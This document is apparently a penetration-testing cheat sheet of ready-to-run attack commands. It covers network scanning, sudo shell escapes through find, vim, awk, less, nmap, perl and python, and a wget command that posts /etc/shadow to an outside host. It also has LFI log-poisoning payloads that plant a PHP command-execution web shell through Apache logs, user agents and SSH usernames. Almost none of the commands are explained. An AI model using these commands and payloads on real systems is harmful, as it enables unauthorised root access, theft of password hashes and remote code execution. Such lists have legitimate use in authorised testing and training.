# Pentest
> Notes, exploits and files for the pentest

## Finding the IP address

### Fping
* fping -a -g 192.168.1.0/24

### Nmap
* [Nmap man](https://nmap.org/book/man-briefoptions.html)
* nmap -F 192.168.1.0/24 | fast
* nmap -A -sV -oX file.xml 192.168.1.0/24   |  Agressive 
* nmap -sS 192.168.1.0/24 -p- (-p 1 -65535)  |   Syn ACK
* nmap -sU 192.168.1.0/24 -p-   |  UDP
* nmao -O 192.168.1.1  |   OS

### Netdiscover
* netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24

### Hping3
* hping3 -S --scan know 192.168.1.1
* hping3 -S -r -p 135 10.50.97.10 

### Egress Port Enumeration
* [Egresscheck framework](https://github.com/stufus/egresscheck-framework)
* nmap -Pn -p 1-65535 192.168.1.1

## Privilege Escalation
[A GUIDE TO LINUX PRIVILEGE ESCALATION](https://payatu.com/guide-linux-privilege-escalation/) 

[Escape From SHELLcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)

### Sudo
### /usr/bin/find
* find /home -exec sh -i \;
* find /etc/passwd -exec /bin/sh \;
* find /bin -name nano -exec /bin/sh \;

### /usr/bin/nano
* nano  /etc/passwd

### /usr/bin/vim
* vim -c '!sh'

### /usr/bin/man
* man man
* !sh

### /usr/bin/awk
* awk 'BEGIN {system("/bin/sh")}'

### /usr/bin/less
* less /etc/hosts
* !sh (!bash)

### /usr/bin/nmap ( –interactive and –script method)
* nmap --interactive
* !sh
* echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse

### /bin/more
* more /etc/hosts
* !sh

### /usr/bin/wget
* wget http://192.168.56.1/passwd -O /etc/passwd
* wget --post-file=/etc/shadow 192.168.56.1

### /usr/sbin/apache2
* apache2 -f /etc/shadow

### perl
* perl -e 'exec "/bin/bash";'

### python
* python -c 'import pty;pty.spawn("/bin/bash")'

### vi
* !bash

### mysql
* \! sh

## SMPT (Port 25)
### Vulnerability scan
* nmap –script vuln -p 25 172.16.212.133
* nmap –script smtp* -p 25 172.16.212.133

### User Enumeration
#### Metasploit
* use auxiliary/scanner/smtp/smtp_enum

#### smtp-user-enum
* smtp-user-enum -U /root/Desktop/user.txt -t 192.168.1.1

#### iSMTP
* ismtp -h 192.168.1.107:25 -e /root/Desktop/email.txt

#### NMAP
* nmap –script smtp-enum-users.nse 192.168.1.1

# Vulnerabilities
## LFI (Local File Inclusion)
### Poisoning
#### Apache error.log
* /var/log/apache2/error.log&c=ifconfig
* <!--?php system($_GET['cmd']); ?--> - comment 
* %3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E
* <%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F>

#### Apache access.log
* /var/log/apache2/access.log&c=ifconfig
* In user agent <?php system($_GET['c']); ?>

#### SSH auth.log
* /var/log/auth.log
* ssh ‘<?php system($_GET[‘c’]); ?>’@192.168.1.1
